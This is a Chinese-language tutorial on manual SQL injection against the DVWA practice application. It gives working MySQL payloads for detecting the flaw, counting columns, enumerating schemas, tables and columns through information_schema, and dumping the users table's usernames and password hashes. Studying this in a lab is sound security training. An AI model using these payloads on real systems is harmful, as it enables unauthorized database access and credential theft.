一、SQL注入原理

要理解SQL注入的原理，就必须了解能够对数据库中的信息进行增删改查的SQL语言。Sql 注入攻击就是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。当然，根据数据库版本类型的不同，相应的注入语句也有所不同，这需要我们去了解学习。

2.判断是否存在注入点，以及注入的类型

构造后的payload就是
SELECT first_name, last_name FROM users WHERE user_id = ''';
SELECT first_name, last_name FROM users WHERE user_id = '\';
(这里其实我们并不知道它查询的内容，表，查询参数是什么，会在后面说明为什么是这几个参数，这里写出来是为了好理解)

  • 对于MySQL，它的内容注释是#和--
  • Mysql安装后默认会创建三个数据库：information_schema、mysql和test。其中名为“mysql”的数据库很重要，它里面保存有MYSQL的系统信息、用户修改密码和新增用户，实际上就是针对该数据库中的有关数据表进行操作。


有内容输出，分别是ID，First name，Surname字段名及其值

构造的payload：
SELECT first_name, last_name FROM users WHERE user_id = '1' or 1=1 #';
SELECT first_name, last_name FROM users WHERE user_id = '1' or 1=1 -- ;


根据我们构造的永真语句，可以看到后台把所有的First name，Surname输出了

我们可以得到数据库中用户表的行数（rows）为 5

现在我们判定这个页面存在字符型的sql注入漏洞

3.获取数据库信息

猜解所查询的字段数目

方式1：order by num#进行猜解
如果num的值大于查询语句中的字段数，就会报错

输入：1' order by 1# 1' order by 2# 1' order by 3#等等



我们知道了select查询语句的字段数为 2

方式2： union select 1,2,3...

tips： UNION操作符用于合并两个或多个SELECT语句的结果集，这里需要注意的是：UNION内部的SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时，每条SELECT语句中列的顺序必须相同。

所以我们构造payload：
1' union select 1 #
1' union select 1,2 #
1' union select 1,2,3 #



获取字段显示位

在页面上会显示从select语句中选取的字段，通过以上方式2中的union select 1,2,3…可判断出具体显示字段的显示位

显示位的作用： 在知道显示位之后，就可以通过显示位来显示我们想知道的数据库信息，如数据库的版本，用户信息等…

通过显示位获取数据库信息

这里需要我们知道一些关于数据库中的常用函数
传送门：SQL注入常用函数整理

  • 获取当前连接的数据库名称、数据库版本：
    1' union select database(),version() #

  • 获取当前连接数据库的用户
    1' union select user(),2 #

  • 获取服务器的操作系统、数据库的存储目录
    1' union select @@version_compile_os,@@datadir #

    获取数据库中的表名

  • 获取DBMS中所有数据库的名称

    Mysql安装后默认会创建三个数据库：information_schema、mysql和test；information_schema库下的schemata表中保存着DBMS中的所有数据库名称信息。

    构造payload：
    1' union select 1,schema_name from information_schema.schemata #
    当我们输入这段payload时，报出了一个错误

    意思是我们的语句没有满足union的语法，没办法，老百度人啦，上网找答案发现是两个select语句查找的内容的字节序编码不一致导致的。确实，union构造的两个select语句查询的字段内容编码必须是一致的，直接改数据库中的编码就可以啦。
    但是有一个问题，我们是攻击测试，怎么能改后台数据库中的数据呢，所以我们构造语句：
    1' union select 1,hex(schema_name) from information_schema.schemata #
    对查找的内容进行十六进制转码就可以啦

    虽然得到的是十六进制的字符串，但是解码还是能得到结果的

  • 获取当前连接数据库(dvwa)中的所有表

    1' union select 1,group_concat(hex(table_name)) from information_schema.tables where table_schema=database() #

获取表中的列名（字段）

方式1： 1' union select 1,group_concat(hex(column_name)) from information_schema.columns where table_name='users' #

方式2： 通过猜测的方式，没有第一种方式好用，有兴趣的可以看一看大佬的博客，这里就不说啦
传送门：猜测字段数和字段名

导出数据库中的数据

知道有哪些字段名了，我们就可以导出数据啦
1' union select 1,group_concat(concat_ws('--',user,password)) from users #


group_concat()函数是将结果放在一起以都逗号间隔的方式输出，我们也可以一个一个的输出

1' union select 1,concat_ws('--',user,password) from users #
